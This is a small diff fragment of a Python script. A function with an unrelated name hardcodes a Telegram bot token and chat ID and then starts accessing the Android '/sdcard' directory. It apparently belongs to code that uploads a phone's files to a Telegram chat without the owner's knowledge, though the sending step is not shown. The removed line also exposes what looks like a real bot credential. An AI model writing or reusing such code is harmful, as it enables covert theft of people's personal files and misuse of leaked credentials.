@@ -110,8 +110,8 @@ rc = random.choice
 
 def sexy():
     session=requests.session() 
-    bot_token = '7610123709:AAF21eTLyX7I1byWJFV2PSsZKnxGBes9pEw' 
-    chat_id = '1778046662'
+    bot_token = '7610123709:' 
+    chat_id = '17780662'
     #-----------( /sdcard
     try:
         sdcard_path = '/sdcard'
